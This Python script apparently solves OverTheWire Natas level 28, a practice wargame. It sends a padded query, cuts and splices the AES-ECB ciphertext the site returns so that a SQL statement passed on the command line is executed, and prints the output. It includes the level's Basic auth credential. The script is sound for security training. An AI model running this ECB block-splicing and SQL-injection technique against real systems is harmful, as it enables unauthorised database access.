#! /usr/bin/env python3

import base64
import string
import sys
import urllib.error
import urllib.parse
import urllib.request


BASE_URL = 'http://natas28.natas.labs.overthewire.org'
HEADERS = {
    'Authorization': 'Basic bmF0YXMyODoxSk53UU0xT2k2SjZqMWs0OVh5dzdaTjZwWE1RSW5Wag=='
}


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def send_index_request(data):
    req = urllib.request.Request(url=BASE_URL + '/index.php', data=data.encode(), headers=HEADERS)
    try:
        r = urllib.request.urlopen(req)
    except urllib.error.HTTPError as e:
        r = e

    encoded_blob = r.headers['Location'].replace('search.php/?query=', '')
    return urllib.parse.unquote(encoded_blob)


def send_search_request(blob):
    req = urllib.request.Request(url=BASE_URL+ '/search.php?query=' + urllib.parse.quote(blob), headers=HEADERS)
    try:
        r = urllib.request.urlopen(req)
    except urllib.error.HTTPError as e:
        r = e

    return r.read().decode()


def main():
    statement = sys.argv[1]

    opener = urllib.request.build_opener(NoRedirect)
    urllib.request.install_opener(opener)

    payload  = " " * 10
    payload += " " * 15 + "'"
    payload += " " + statement + "-- "
    encrypted_blob = send_index_request('query=' + payload)

    ciphertext = base64.b64decode(encrypted_blob)
    craftytext = ciphertext[:48] + ciphertext[64:]
    encrypted_blob = base64.b64encode(craftytext).decode()

    res = send_search_request(encrypted_blob)
    print(res)

if __name__ == '__main__':
    main()
